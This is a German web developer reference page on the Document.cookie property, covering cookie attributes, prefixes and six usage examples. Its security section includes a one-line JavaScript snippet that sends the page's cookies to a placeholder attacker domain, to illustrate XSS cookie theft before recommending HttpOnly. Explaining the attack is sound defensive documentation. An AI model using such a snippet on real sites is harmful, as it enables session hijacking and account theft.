---
title: "Dokument: cookie-Eigenschaft"
short-title: cookie
slug: Web/API/Document/cookie
l10n:
  sourceCommit: c096b8b65f8d0f0e5a1057e6a9165c96bdee9559
---

{{APIRef("DOM")}}

Die [`Document`](/de/docs/Web/API/Document)-Eigenschaft `cookie` erlaubt es Ihnen, die mit dem Dokument verbundenen [Cookies](/de/docs/Web/HTTP/Guides/Cookies) zu lesen und zu schreiben. Sie dient als Getter und Setter für die tatsächlichen Werte der Cookies.

## Wert

Ein String, der eine durch Semikolon getrennte Liste aller Cookies enthält (d.h. `key=value`-Paare). Beachten Sie, dass jeder _key_ und _value_ von Leerzeichen (Leer- und Tabulatorzeichen) umgeben sein kann: Tatsächlich verlangt {{RFC(6265)}} ein einzelnes Leerzeichen nach jedem Semikolon, aber einige User Agents halten sich möglicherweise nicht daran.

Sie können dieser Eigenschaft auch einen String der Form `"key=value"` zuweisen, der das Cookie angibt, das Sie setzen/aktualisieren möchten. Beachten Sie, dass Sie mit dieser Methode immer nur ein einzelnes Cookie setzen/aktualisieren können. Berücksichtigen Sie auch, dass:

- Jeder der folgenden Cookie-Attributwerte optional dem Schlüssel-Wert-Paar folgen kann, wobei jeder durch ein Semikolon-Trennzeichen vorausgeht:
  - `;domain=domain` (z.B. `example.com` oder `subdomain.example.com`): Der Host, an den das Cookie gesendet wird.
    Wenn nicht angegeben, wird dies standardmäßig auf den Host-Teil des aktuellen Dokumentstandorts gesetzt und das Cookie ist auf Subdomains nicht verfügbar.
    Wird eine Domain angegeben, sind Subdomains immer eingeschlossen.
    Entgegen früherer Spezifikationen werden führende Punkte in Domainnamen ignoriert, aber Browser können ablehnen, das Cookie zu setzen, das solche Punkte enthält.

    > [!NOTE]
    > Die Domain _muss_ mit der Domain des JavaScript-Ursprungs übereinstimmen.
    > Das Setzen von Cookies für fremde Domains wird stillschweigend ignoriert.

  - `;expires=date-in-UTCString-format`: Das Ablaufdatum des Cookies. Wenn weder `expires` noch `max-age` angegeben werden, läuft es am Ende der Sitzung ab.

    > [!WARNING]
    > Wenn der Datenschutz der Nutzer eine Rolle spielt, ist es wichtig, dass jede Web-App-Implementierung Cookie-Daten nach einem bestimmten Timeout invalidiert, anstatt sich darauf zu verlassen, dass der Browser dies tut.
    > Viele Browser lassen zu, dass Benutzer Cookies nie ablaufen lassen, was nicht unbedingt sicher ist.

    Siehe {{jsxref("Date.toUTCString()")}} für Hilfe beim Formatieren dieses Wertes.

  - `;max-age=max-age-in-seconds`: Die maximale Lebensdauer des Cookies in Sekunden (z.B. `60*60*24*365` oder 31536000 für ein Jahr).

  - `;partitioned`: Gibt an, dass das Cookie mit partitioniertem Speicher gespeichert werden soll. Siehe [Cookies mit unabhängigem partitioniertem Zustand (CHIPS)](/de/docs/Web/Privacy/Guides/Privacy_sandbox/Partitioned_cookies) für weitere Details.

  - `;path=path`: Der Wert des `Path`-Attributs des Cookies (siehe [Definieren, wo Cookies gesendet werden](/de/docs/Web/HTTP/Guides/Cookies#define_where_cookies_are_sent) für mehr Informationen).

  - `;samesite`: Das `SameSite`-Attribut eines {{httpheader("Set-Cookie")}}-Headers kann von einem Server gesetzt werden, um anzugeben, wann das Cookie gesendet wird. Mögliche Werte sind `lax`, `strict` oder `none` (siehe auch [Kontrollieren von Drittanbieter-Cookies mit `SameSite`](/de/docs/Web/HTTP/Guides/Cookies#controlling_third-party_cookies_with_samesite)).
    - Der Wert `lax` sendet das Cookie für alle Same-Site-Anfragen und Navigation-GET-Anfragen auf oberster Ebene.
      Dies reicht für das Nutzer-Tracking aus, wird jedoch viele {{Glossary("CSRF", "Cross-Site Request Forgery")}}-Angriffe (CSRF) verhindern.
      Dies ist der Standardwert in modernen Browsern.
    - Der Wert `strict` verhindert, dass das Cookie vom Browser an die Zielseite in allen cross-site Browsing-Kontexten gesendet wird, auch wenn einem regulären Link gefolgt wird.
    - Der Wert `none` gibt ausdrücklich an, dass keine Einschränkungen gelten.
      Das Cookie wird in allen Anfragen gesendet—sowohl cross-site als auch same-site.

  - `;secure`: Gibt an, dass das Cookie nur über ein sicheres Protokoll übertragen werden soll.

- Der Cookie-Wert-String kann {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} verwenden, um sicherzustellen, dass der String keine Kommas, Semikolons oder Leerzeichen enthält (die in Cookie-Werten nicht erlaubt sind).
- Einige User-Agent-Implementierungen unterstützen die folgenden Cookie-Präfixe:
  - `__Secure-` Signalisieren dem Browser, dass er das Cookie nur in Anfragen einschließen soll, die über einen sicheren Kanal übertragen werden.
  - `__Host-` Signalisieren dem Browser, dass zusätzlich zur Einschränkung der Nutzung des Cookies nur von einem sicheren Ursprung der Geltungsbereich des Cookies auf ein vom Server übergebenes Path-Attribut beschränkt ist.
    Wenn der Server das Path-Attribut weglässt, wird das "Verzeichnis" der Anforderungs-URI verwendet.
    Es signalisiert auch, dass das Domain-Attribut nicht vorhanden sein darf, was verhindert, dass das Cookie an andere Domains gesendet wird.
    Für Chrome muss das Path-Attribut stets der Ursprung sein.

  > [!NOTE]
  > Der Bindestrich wird als Teil des Präfixes betrachtet.

  > [!NOTE]
  > Diese Flags sind nur zusammen mit dem `secure`-Attribut setzbar.

> [!NOTE]
> Wie Sie aus dem obigen Code sehen können, ist `document.cookie` eine [Zugriffseigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit nativen _Setter_- und _Getter_-Funktionen und ist folglich _keine_ [Dateneigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit einem Wert: was Sie schreiben, ist nicht dasselbe wie das, was Sie lesen, alles wird immer vom JavaScript-Interpreter vermittelt.

## Beispiele

### Beispiel 1: Einfache Nutzung

```html
<button id="show">Show cookies</button>
<button id="clear">Clear</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "name=Oeschger; SameSite=None; Secure";
document.cookie = "favorite_food=tripe; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  output.textContent = `> ${document.cookie}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}

### Beispiel 2: Abrufen eines Beispiel-Cookies namens test2

```html
<button id="show">Show cookie value</button>
<button id="clear">Clear</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "test1=Hello; SameSite=None; Secure";
document.cookie = "test2=World; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  const cookieValue = document.cookie
    .split("; ")
    .find((row) => row.startsWith("test2="))
    ?.split("=")[1];
  output.textContent = `> ${cookieValue}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 72)}}

### Beispiel 3: Etwas nur einmal tun

Um den folgenden Code zu verwenden, ersetzen Sie bitte alle Vorkommen des Wortes `doSomethingOnlyOnce` (der Name des Cookies) durch einen benutzerdefinierten Namen.

```html
<button id="do-once">Only do something once</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const doOnceBtn = document.getElementById("do-once");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

doOnceBtn.addEventListener("click", () => {
  if (
    !document.cookie
      .split("; ")
      .find((row) => row.startsWith("doSomethingOnlyOnce"))
  ) {
    // Note that we are setting `SameSite=None;` in this example because the example
    // needs to work cross-origin.
    // It is more common not to set the `SameSite` attribute, which results in the default,
    // and more secure, value of `SameSite=Lax;`
    document.cookie =
      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";

    output.textContent = "> Do something here!";
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_3_Do_something_only_once', 200, 72)}}

### Beispiel 4: Zurücksetzen des vorherigen Cookies

```html
<button id="reset">Reset only once cookie</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const resetBtn = document.getElementById("reset");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

resetBtn.addEventListener("click", () => {
  // Note that we are setting `SameSite=None;` in this example because the example
  // needs to work cross-origin.
  // It is more common not to set the `SameSite` attribute, which results in the default,
  // and more secure, value of `SameSite=Lax;`
  document.cookie =
    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";

  const output = document.getElementById("reset-once");
  output.textContent = "> Reset!";
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 72)}}

### Beispiel 5: Überprüfen, ob ein Cookie existiert

```html
<button id="check">Check a cookie exists</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "reader=1; SameSite=None; Secure";

checkBtn.addEventListener("click", () => {
  if (
    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
  ) {
    output.textContent = '> The cookie "reader" exists';
  } else {
    output.textContent = '> The cookie "reader" does not exist';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_5_Check_a_cookie_existence', 200, 72)}}

### Beispiel 6: Überprüfen, ob ein Cookie einen bestimmten Wert hat

```html
<button id="check">Check that a cookie has a specific value</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

checkBtn.addEventListener("click", () => {
  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
    output.textContent = '> The cookie "reader" has a value of "1"';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_6_Check_that_a_cookie_has_a_specific_value', 200, 72)}}

## Sicherheit

Es ist wichtig zu beachten, dass das `path`-Attribut _nicht_ gegen das unbefugte Lesen des Cookies von einem anderen Pfad schützt. Es kann leicht unter Verwendung des DOM umgangen werden, indem zum Beispiel ein verstecktes {{HTMLElement("iframe")}}-Element mit dem Pfad des Cookies erstellt wird und dann auf die `contentDocument.cookie`-Eigenschaft dieses Iframes zugegriffen wird. Der einzige Weg, das Cookie zu schützen, ist die Verwendung einer anderen Domain oder Subdomain aufgrund der [Same-Origin-Policy](/de/docs/Web/Security/Same-origin_policy).

Cookies werden häufig in Webanwendungen verwendet, um einen Benutzer und seine authentifizierte Sitzung zu identifizieren. Das Stehlen eines Cookies aus einer Webanwendung führt zum Hijacken der authentifizierten Benutzersitzung. Häufige Methoden, um Cookies zu stehlen, sind die Verwendung von [Social Engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) oder das Ausnutzen einer {{Glossary("Cross-site_scripting", "Cross-Site-Scripting")}} (XSS)-Schwachstelle in der Anwendung -

```js
new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
```

Das `HTTPOnly`-Cookie-Attribut kann helfen, diesen Angriff zu mindern, indem der Zugriff auf den Cookie-Wert durch JavaScript verhindert wird. Lesen Sie mehr über [Cookies und Sicherheit](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).

## Anmerkungen

- Ab Firefox 2 steht ein besserer Mechanismus für die clientseitige Speicherung zur Verfügung - [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API).
- Sie können ein Cookie löschen, indem Sie seine Ablaufzeit auf null setzen.
- Beachten Sie, dass je mehr Cookies Sie haben, desto mehr Daten zwischen dem Server und dem Client für jede Anfrage übertragen werden. Dies macht jede Anfrage langsamer. Es wird dringend empfohlen, [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API) zu verwenden, wenn Sie "nur Client" Daten speichern müssen.
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (Abschnitt 5.3, "Implementierungsgrenzen") gibt an, dass es **keine maximale Länge** für die Größe eines Cookie-Schlüssels oder -Wert geben sollte und ermutigt Implementierungen, **beliebig große Cookies** zu unterstützen. Die maximale Implementierung wird notwendigerweise in jedem Browser unterschiedlich sein, daher konsultieren Sie die Dokumentation einzelner Browser.

Der Grund für die Asymmetrie zwischen dem Abrufen und Einstellen der `document.cookie` Zugriffeigenschaft liegt in der Client-Server-Natur von Cookies, die sich von anderen client-client Speicherungsmethoden (wie zum Beispiel [localStorage](/de/docs/Web/API/Web_Storage_API)) unterscheidet:

- Der Server weist den Client an, ein Cookie zu speichern:

  ```http
  HTTP/1.0 200 OK
  Content-type: text/html
  Set-Cookie: cookie_name1=cookie_value1
  Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

  [content of the page here]
  ```

- Der Client sendet seine zuvor gespeicherten Cookies an den Server zurück:

  ```http
  GET /sample_page.html HTTP/1.1
  Host: www.example.org
  Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
  Accept: */*
  ```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [HTTP-Cookies](/de/docs/Web/HTTP/Guides/Cookies)
- [DOM Storage](/de/docs/Web/API/Web_Storage_API)
- [`URL.pathname`](/de/docs/Web/API/URL/pathname)
- {{jsxref("Date.toUTCString()")}}
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965)
